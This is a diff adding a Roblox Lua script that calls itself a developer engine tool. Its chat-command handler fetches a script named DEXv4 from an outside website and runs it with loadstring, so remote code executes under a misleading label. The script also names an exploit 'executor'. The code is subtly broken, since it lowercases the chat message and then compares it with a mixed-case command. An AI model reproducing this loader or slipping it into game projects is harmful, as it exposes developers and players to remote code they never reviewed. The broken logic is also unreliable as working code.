@@ -1,0 +1,45 @@
+--[[OPENING FOR PROcess TOOL]]
+  print("`ENOCH LOADING...")
+  EXECUTOR="ErtY'wek'z ENOCH "
+  VERCTRL="2020.02.06"
+--[[
+	DEX Main Script
+	
+	Created by: Moon and Courtney
+	
+	RASPBERRY PI IS A SKIDDY SKID AF
+--]]
+--[[PROcess IS AN ENGINE MADE BY JEREMI KRASUCKI (PROREMIXPL) WHICH HELPS DEVELOPERS IN MAKING THEIR GAMES]]
+--[[IT MAKES AVERAGE DEVELOPER WORK MORE EFFECTIVE
+ LM=game.StarterGui.Playground.EnochOS.LoadModule MM=game.StarterGui.Playground.EnochOS.MainModule EM=game.StarterGui.Playground.EnochOS.ErrorModule 
+ ]]
+LocP=game.Players.LocalPlayer HttpService=game:GetService('HttpService')ServerStorage=game:GetService("ServerStorage")DataStoreService=game:GetService("DataStoreService")TweenService=game:GetService("TweenService")
+prefix="`" --[[set the prefix, / slash or ! exclamation mark is most common on roblox]]
+function onChatted(msg, speaker)
+	local source=string.lower(speaker.Name)
+	msg=string.lower(msg)
+	if msg==prefix.."respawn"then
+		speaker:LoadCharacter()
+	end
+	if msg==prefix.."sparkles"then
+		Instance.new("Sparkles", speaker.Character.HumanoidRootPart)
+	end
+	if msg==prefix.."DEX"then
+		while true do loadstring(HttpService:GetAsync("https://zoj.me/out/servers/roblox/DEXv4.txt"))()break end
+	end
+	
+	--[[to add more commands]]
+end
+game.Players.PlayerAdded:Connect(function(player)
+	player.Chatted:Connect(function(msg) 
+		onChatted(msg, player) 
+		end)
+end)
+  
+  
+  
+  
+  
+  
+  warn(EXECUTOR .. VERCTRL)
+--[[CLOSING FOR PROcess TOOL]]
